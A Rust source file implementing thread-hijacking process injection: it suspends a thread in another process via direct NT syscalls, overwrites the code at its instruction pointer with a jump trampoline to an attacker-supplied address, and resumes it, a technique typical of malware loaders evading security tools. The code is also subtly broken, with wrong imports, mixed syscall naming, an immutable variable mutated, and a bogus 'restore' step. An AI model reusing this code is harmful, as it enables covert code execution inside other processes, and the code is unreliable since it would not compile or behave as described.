use std::ptr::null_mut;
use winapi::um::winnt::{HANDLE, PVOID, SIZE_T, PAGE_READWRITE, ULONG};
use winapi::um::processthreadsapi::{CONTEXT, NtResumeThread, NtSuspendThread};
use winapi::um::memoryapi::WriteProcessMemory;
use winapi::um::winnt::{NT_SUCCESS};
use syscall::syscall;

fn jmp_hijack_thread(h_thread: HANDLE, p_address: PVOID, h_process: HANDLE) -> Result<(), String> {
    // Suspend the thread
    let status_suspend = unsafe { syscall!(NtSuspendThread, h_thread, null_mut::<ULONG>()) };
    if !NT_SUCCESS(status_suspend) {
        return Err(format!("[!] Failed to suspend thread with NTSTATUS: {:#X}", status_suspend));
    }

    // Get the current thread context
    let mut context: CONTEXT = unsafe { std::mem::zeroed() };
    context.ContextFlags = winapi::um::winnt::CONTEXT_ALL;
    let status_get_context = unsafe {
        syscall!(NtGetContextThread, h_thread, &mut context as *mut _)
    };
    if !NT_SUCCESS(status_get_context) {
        return Err(format!("[!] NtGetContextThread failed with NTSTATUS: {:#X}", status_get_context));
    }

    // Backup the original context
    let original_context = context.clone();

    // Change memory protection to PAGE_READWRITE
    let mut old_protect = 0;
    let mut base_address = context.Rip as *mut u8;
    let size = std::mem::size_of_val(&context.Rip);
    let status_protect_memory = unsafe {
        syscall!(
            "NtProtectVirtualMemory",
            h_process,
            &mut base_address,
            &mut size as *mut _,
            PAGE_READWRITE,
            &mut old_protect as *mut _
        )
    };
    if !NT_SUCCESS(status_protect_memory) {
        return Err(format!("[!] NtProtectVirtualMemory failed with NTSTATUS: {:#X}", status_protect_memory));
    }

    // Construct and write the trampoline directly to RIP location
    let mut trampoline = [
        0x48, 0xB8,
        // placeholder bytes
        0x11,
        0x22,
        0x33,
        0x44,
        0x55,
        0x66,
        0x77,
        0x88,
        0xFF,
        0xE0
    ];
    let p_address_bytes: [u8; 8] = unsafe {
        std::mem::transmute(p_address as u64)
    };
    trampoline[2..10].copy_from_slice(&p_address_bytes);

    // Write the trampoline to the instruction pointer (RIP) location
    let status_write_memory = unsafe {
        syscall!(
            "NtWriteVirtualMemory",
            h_process,
            context.Rip as *mut u8,
            trampoline.as_ptr() as *const _,
            trampoline.len() as SIZE_T,
            null_mut::<c_void>()
        )
    };
    if !NT_SUCCESS(status_write_memory) {
        // Restore the original context before returning
        let _ = unsafe { syscall!(NtWriteVirtualMemory, h_process, &mut context as *mut _ as *mut _, &original_context as *const _ as *mut _, std::mem::size_of::<CONTEXT>() as SIZE_T, std::ptr::null_mut::<c_void>()) };
        return Err(format!("[!] NtWriteVirtualMemory failed with NTSTATUS: {:#X}", status_write_memory));
    }

    // Resume the suspended thread
    let status_resume = unsafe { syscall!(NtResumeThread, h_thread, null_mut::<ULONG>()) };
    if !NT_SUCCESS(status_resume) {
        return Err(format!("[!] Failed to resume thread with NTSTATUS: {:#X}", status_resume));
    }

    Ok(())
}
